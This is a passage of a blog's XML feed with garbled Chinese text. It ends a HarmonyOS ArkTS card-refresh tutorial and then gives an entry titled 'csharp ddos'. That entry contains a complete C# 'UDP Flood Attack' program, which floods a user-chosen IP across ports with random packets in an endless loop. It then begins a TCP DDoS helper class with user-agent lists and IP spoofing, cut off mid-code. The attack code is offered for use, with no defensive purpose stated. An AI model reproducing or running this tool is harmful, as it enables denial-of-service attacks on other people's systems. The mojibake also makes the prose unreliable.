æ­¤æ¯éš”0.5å°æ—¶åˆ·æ–°ï¼Œåˆ™<strong>updateDuration</strong>å­—æ®µå€¼åº”è¯¥è®¾ä¸º1ï¼ŒåŒæ—¶å°†<strong>updateEnabled</strong>å­—æ®µå€¼è®¾ä¸ºtrue</li></ul><p>EntryFormAbility.tsä¸­çš„onUpdateFormç”Ÿå‘½å‘¨æœŸå›è°ƒå…·ä½“ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onUpdateForm</span>(<span class="params">formId</span>) &#123;</span><br><span class="line">    <span class="comment">//è®¾ç½®å®šæ—¶æˆ–å®šç‚¹æ›´æ–°å,ç³»ç»Ÿå°±ä¼šè§¦å‘è¯¥å›è°ƒ</span></span><br><span class="line">    <span class="keyword">let</span> formData = &#123;</span><br><span class="line">       <span class="string">&#x27;recommend2&#x27;</span>: <span class="string">&#x27;å®šæ—¶åˆ·æ–°&#x27;</span>, <span class="comment">//è¦åˆ·æ–°çš„å…·ä½“å†…å®¹ï¼Œå’Œå¡ç‰‡å¸ƒå±€ä¸­å¯¹åº”</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> formInfo = formBindingData.<span class="title function_">createFormBindingData</span>(formData)</span><br><span class="line">    <span class="comment">// è°ƒç”¨updateFormæ¥å£åˆ·æ–°å¡ç‰‡</span></span><br><span class="line">    formProvider.<span class="title function_">updateForm</span>(formId, formInfo).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;FormAbility updateForm success.&#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;FormAbility updateForm failed: &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(error));</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="å¡ç‰‡çš„å®šç‚¹åˆ·æ–°"><a href="#å¡ç‰‡çš„å®šç‚¹åˆ·æ–°" class="headerlink" title="å¡ç‰‡çš„å®šç‚¹åˆ·æ–°"></a>å¡ç‰‡çš„å®šç‚¹åˆ·æ–°</h2><p>åœ¨å¡ç‰‡çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬å¸Œæœ›å¡ç‰‡çš„å†…å®¹å¯ä»¥å®šç‚¹è‡ªåŠ¨åˆ·æ–°ï¼Œæ¯”å¦‚æ¯å¤©ä¸Šåˆçš„10:30å°±è‡ªåŠ¨åˆ·æ–°å¡ç‰‡å†…å®¹ï¼Œå®šç‚¹åˆ·æ–°çš„åŠŸèƒ½æ•ˆæœï¼ŒåŒæ ·å¯æ‹†åˆ†ä¸ºä»¥ä¸‹ä¸¤ä¸ªéƒ¨åˆ†å®ç°ï¼š</p><ul><li>é¦–å…ˆï¼Œéœ€è¦åœ¨â€œresources&gt;base&gt;profileâ€ç›®å½•ä¸‹çš„form_config.jsoné…ç½®æ–‡ä»¶ä¸­å¯¹<strong>scheduledUpdateTime</strong>å­—æ®µè¿›è¡Œè®¾ç½®ã€‚</li><li>å…¶æ¬¡ï¼Œåœ¨è§¦å‘å®šç‚¹åˆ·æ–°åï¼Œç³»ç»Ÿä¼šè°ƒç”¨EntryFormAbility.tsä¸­çš„onUpdateFormç”Ÿå‘½å‘¨æœŸå›è°ƒï¼Œåœ¨å›è°ƒä¸­ï¼Œå¯ä»¥ä½¿ç”¨updateFormè¿›è¡Œæä¾›æ–¹åˆ·æ–°å¡ç‰‡ã€‚<br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®šæ—¶åˆ·æ–°ä¸å®šç‚¹åˆ·æ–°ä¹‹é—´å­˜åœ¨ä¼˜å…ˆçº§é—®é¢˜ï¼Œ<strong>updateDuration</strong>ï¼ˆå®šæ—¶åˆ·æ–°ï¼‰ä¼˜å…ˆçº§æ¯”<strong>scheduledUpdateTime</strong>ï¼ˆå®šç‚¹åˆ·æ–°ï¼‰é«˜ï¼Œé…ç½®å®šæ—¶åˆ·æ–°åï¼Œå®šç‚¹åˆ·æ–°å°†å¤±æ•ˆã€‚<br>å¦‚æœåŒæ—¶é…ç½®äº†<strong>updateDuration</strong>ï¼ˆå®šæ—¶åˆ·æ–°ï¼‰å’Œ<strong>scheduledUpdateTime</strong>ï¼ˆå®šç‚¹åˆ·æ–°ï¼‰ï¼Œæƒ³è¦å®šç‚¹åˆ·æ–°ç”Ÿæ•ˆï¼Œåˆ™éœ€è¦å°†<strong>updateDuration</strong>é…ç½®ä¸º0ã€‚<br>æ­¤å¤„å¦‚æƒ³å®ç°æ¯å¤©10:30å®šç‚¹åˆ·æ–°å¡ç‰‡å†…å®¹ï¼Œåˆ™é¡»åœ¨é…ç½®æ–‡ä»¶ä¸­å°†<strong>updateDuration</strong>é…ç½®ä¸º0ï¼ŒåŒæ—¶<strong>scheduledUpdateTime</strong>è®¾ç½®ä¸º10:30ï¼Œå°†<strong>updateEnabled</strong>å­—æ®µå€¼è®¾ä¸ºtrue</li></ul><p>åŒæ ·åœ°ï¼Œå®šç‚¹åˆ·æ–°è§¦å‘åï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è°ƒç”¨EntryFormAbility.tsä¸­çš„onUpdateFormç”Ÿå‘½å‘¨æœŸå›è°ƒï¼ŒonUpdateFormå…·ä½“ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onUpdateForm</span>(<span class="params">formId</span>) &#123;</span><br><span class="line">    <span class="comment">//è®¾ç½®å®šæ—¶æˆ–å®šç‚¹æ›´æ–°å,ç³»ç»Ÿå°±ä¼šè§¦å‘è¯¥å›è°ƒ</span></span><br><span class="line">    <span class="keyword">let</span> formData = &#123;</span><br><span class="line">    <span class="comment">//&#x27;recommend2&#x27;: &#x27;å®šæ—¶åˆ·æ–°&#x27;</span></span><br><span class="line">       <span class="string">&#x27;recommend3&#x27;</span>: <span class="string">&#x27;å®šç‚¹åˆ·æ–°&#x27;</span>, <span class="comment">//è¦åˆ·æ–°çš„å…·ä½“å†…å®¹ï¼Œå’Œå¡ç‰‡å¸ƒå±€ä¸­å¯¹åº”</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> formInfo = formBindingData.<span class="title function_">createFormBindingData</span>(formData)</span><br><span class="line">    <span class="comment">// è°ƒç”¨updateFormæ¥å£åˆ·æ–°å¡ç‰‡</span></span><br><span class="line">    formProvider.<span class="title function_">updateForm</span>(formId, formInfo).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;FormAbility updateForm success.&#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;FormAbility updateForm failed: &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(error));</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h2><p>å¦‚æœåœ¨è¿‡ç¨‹ä¸­å‘ç°å®šç‚¹åˆ·æ–°å§‹ç»ˆæ— æ³•ç”Ÿæ•ˆï¼Œè¯·å…ˆæ’æŸ¥æ¨¡æ‹Ÿå™¨ä¸­çš„æ—¶é—´æ˜¯å¦å’ŒçœŸå®çš„æ ‡å‡†æ—¶é—´ä¸€è‡´ï¼Œå¦‚æœä¸ä¸€è‡´ï¼Œå¯ç›´æ¥åœ¨æ¨¡æ‹Ÿå™¨è®¾ç½®ä¸­å®Œæˆæ—¶é—´æ ¡å‡†ï¼Œä¾‹å¦‚å®šç‚¹åˆ·æ–°æ—¶é—´ä¸º10:30ï¼Œåˆ™åœ¨è®¾ç½®ä¸­å°†æ—¶é—´è°ƒæ•´ä¸º10ï¼š29ï¼ˆå› ä¸ºé¡¹ç›®é‡å¯éœ€è¦æ—¶é—´ç¼–è¯‘ï¼‰ï¼Œé‡å¯é¡¹ç›®å·¥ç¨‹~</p><!--æ€§èƒ½ä¼˜åŒ– -> webç»„ä»¶  æé«˜æ€§èƒ½ å„ç§ç»„ä»¶ï¼Œåº”ç”¨å¤æ‚èµ·æ¥ ï¼Œæ›´é«˜é˜¶å®ç°https://lab.huaweicloud.com/experiment-detail_3419?ticket=ST-82364673-adCAa4rYrbwOcoMKV22mVnCo-sso åŸºäºArkTSå¡ç‰‡å¼€å‘çš„é¸¿è’™åº”ç”¨è¶£å‘³æ¡ˆä¾‹https://lab.huaweicloud.com/experimentmanual_3419  å¡ç‰‡ä½¿ç”¨å®æ“å®éªŒAppScope app.json5bundleName å”¯ä¸€src common å¸¸é‡ç±» entryAbility ç”Ÿå‘½å‘¨æœŸ-->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;é¸¿è’™åº”ç”¨-åŸºäºArkTSå¡ç‰‡å¼€å‘-HarmonyOSæœåŠ¡å¡ç‰‡&quot;&gt;&lt;a href=&quot;#é¸¿è’™åº”ç”¨-åŸºäºArkTSå¡ç‰‡å¼€å‘-HarmonyOSæœåŠ¡å¡ç‰‡&quot; class=&quot;headerlink&quot; title=&quot;é¸¿è’™åº”ç”¨-åŸºäºArkTSå¡ç‰‡å¼€å‘-HarmonyOSæœåŠ¡å¡ç‰‡&quot;&gt;</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="HarmonyOS" scheme="https://banjinmei.github.io/tags/HarmonyOS/"/>
    
    <category term="ArkTS" scheme="https://banjinmei.github.io/tags/ArkTS/"/>
    
  </entry>
  
  <entry>
    <title>csharp ddos</title>
    <link href="https://banjinmei.github.io/2024/12/11/csharp-ddos/"/>
    <id>https://banjinmei.github.io/2024/12/11/csharp-ddos/</id>
    <published>2024-12-11T13:19:04.000Z</published>
    <updated>2024-12-11T14:10:59.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UDP-åŒ…å‘"><a href="#UDP-åŒ…å‘" class="headerlink" title="UDP åŒ…å‘"></a>UDP åŒ…å‘</h1><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.Clear();</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;UDP Flood Attack&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Console.WriteLine();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–ç›®æ ‡ IP å’Œç«¯å£</span></span><br><span class="line">        Console.Write(<span class="string">&quot;IP Target : &quot;</span>);</span><br><span class="line">        <span class="built_in">string</span> ip = Console.ReadLine();</span><br><span class="line">        Console.Write(<span class="string">&quot;Port      : &quot;</span>);</span><br><span class="line">        <span class="built_in">int</span> port = <span class="built_in">int</span>.Parse(Console.ReadLine());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‡†å¤‡ UDP å®¢æˆ·ç«¯</span></span><br><span class="line">        UdpClient udpClient = <span class="keyword">new</span> UdpClient();</span><br><span class="line">        <span class="built_in">byte</span>[] bytes = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">1490</span>];</span><br><span class="line">        <span class="keyword">new</span> Random().NextBytes(bytes); <span class="comment">// ç”Ÿæˆéšæœºå­—èŠ‚æ•°æ®</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¨¡æ‹Ÿè¿›åº¦æ¡</span></span><br><span class="line">        Console.Clear();</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Attack Starting&quot;</span>);</span><br><span class="line">        ShowProgressBar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¼€å§‹å‘é€ UDP æ•°æ®åŒ…</span></span><br><span class="line">        <span class="built_in">int</span> sent = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                udpClient.Send(bytes, bytes.Length, ip, port);</span><br><span class="line">                sent++;</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;Sent <span class="subst">&#123;sent&#125;</span> packets to <span class="subst">&#123;ip&#125;</span> through port: <span class="subst">&#123;port&#125;</span>&quot;</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// å¢åŠ ç«¯å£å·</span></span><br><span class="line">                port++;</span><br><span class="line">                <span class="keyword">if</span> (port &gt; <span class="number">65534</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    port = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;Error: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ShowProgressBar</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span>[] delays = &#123; <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span> &#125;;</span><br><span class="line">        <span class="built_in">string</span>[] progress = &#123;</span><br><span class="line">            <span class="string">&quot;[                    ] 0% &quot;</span>,</span><br><span class="line">            <span class="string">&quot;[=====               ] 25%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;[==========          ] 50%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;[===============     ] 75%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;[====================] 100%&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; progress.Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(progress[i]);</span><br><span class="line">            <span class="keyword">if</span> (i &lt; delays.Length)</span><br><span class="line">            &#123;</span><br><span class="line">                Thread.Sleep(delays[i] * <span class="number">1000</span>); <span class="comment">// æ¨¡æ‹Ÿå»¶è¿Ÿ</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>UDP æ•°æ®åŒ…å‘é€ï¼š</strong></p><p>ä½¿ç”¨ C# çš„ UdpClient ç±»å‘é€ UDP æ•°æ®åŒ…ã€‚<br>æ•°æ®åŒ…å†…å®¹ä¸ºéšæœºå­—èŠ‚ï¼Œé€šè¿‡ Random.NextBytes() å¡«å……ã€‚<br>è¿›åº¦æ¡æ˜¾ç¤ºï¼š æ¨¡æ‹Ÿäº†æ”»å‡»å¯åŠ¨çš„åŠ è½½è¿›åº¦ï¼Œç±»ä¼¼åŸå§‹ Python ä»£ç ä¸­çš„è¿›åº¦æ¡ã€‚</p><h1 id="ç«¯å£é€’å¢é€»è¾‘ï¼š"><a href="#ç«¯å£é€’å¢é€»è¾‘ï¼š" class="headerlink" title="ç«¯å£é€’å¢é€»è¾‘ï¼š"></a>ç«¯å£é€’å¢é€»è¾‘ï¼š</h1><p>æ¯æ¬¡å‘é€æ•°æ®åŒ…åï¼Œç«¯å£å·åŠ  1ã€‚<br>è¶…è¿‡ 65534 æ—¶ï¼Œé‡ç½®ä¸º 1ã€‚</p><p>å‚è€ƒï¼š<br><a class="link"   href="https://github.com/Ha3MrX/DDos-Attack/blob/master/ddos-attack.py" >https://github.com/Ha3MrX/DDos-Attack/blob/master/ddos-attack.py<i class="fas fa-external-link-alt"></i></a></p><h1 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h1><h2 id="å·¥å…·ç±»"><a href="#å·¥å…·ç±»" class="headerlink" title="å·¥å…·ç±»"></a>å·¥å…·ç±»</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApp1Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> dstools</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">ds</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">AddBots</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">string</span>&gt; bots = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">            bots.Add(<span class="string">&quot;http://www.bing.com/search?q=%40&amp;count=50&amp;first=0&quot;</span>);</span><br><span class="line">            bots.Add(<span class="string">&quot;http://www.google.com/search?hl=en&amp;num=100&amp;q=intext%3A%40&amp;ie=utf-8&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> bots;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">AddUserAgent</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">string</span>&gt; uagents = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span>[] lines = [<span class="string">&quot;Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36&quot;</span>, <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0&quot;</span>];</span><br><span class="line">                <span class="comment">//System.IO.File.ReadAllLines(&quot;ua.txt&quot;);</span></span><br><span class="line">                uagents.AddRange(lines);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (FileNotFoundException)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.ForegroundColor = ConsoleColor.Yellow;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;[-] No file named &#x27;ua.txt&#x27;,failed to load User-Agents&quot;</span>);</span><br><span class="line">                Console.ResetColor();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> uagents;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IPAddress <span class="title">CheckTgt</span>(<span class="params"><span class="built_in">string</span> tgt</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                IPHostEntry hostEntry = Dns.GetHostEntry(tgt);</span><br><span class="line">                <span class="keyword">return</span> hostEntry.AddressList[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.ForegroundColor = ConsoleColor.Red;</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;[-] Can&#x27;t resolve host:Unknown host!&quot;</span>);</span><br><span class="line">                Console.ResetColor();</span><br><span class="line">                Environment.Exit(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">FakeIP</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Random random = <span class="keyword">new</span> Random();</span><br><span class="line">            <span class="built_in">string</span>[] ips = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">int</span> num = random.Next(<span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">                <span class="keyword">if</span> (num == <span class="number">127</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    i--;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ips[i] = num.ToString();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">string</span>.Join(<span class="string">&quot;.&quot;</span>, ips);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç½‘ç»œæ•°æ®ç±»"><a href="#ç½‘ç»œæ•°æ®ç±»" class="headerlink" title="ç½‘ç»œæ•°æ®ç±»"></a>ç½‘ç»œæ•°æ®ç±»</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span 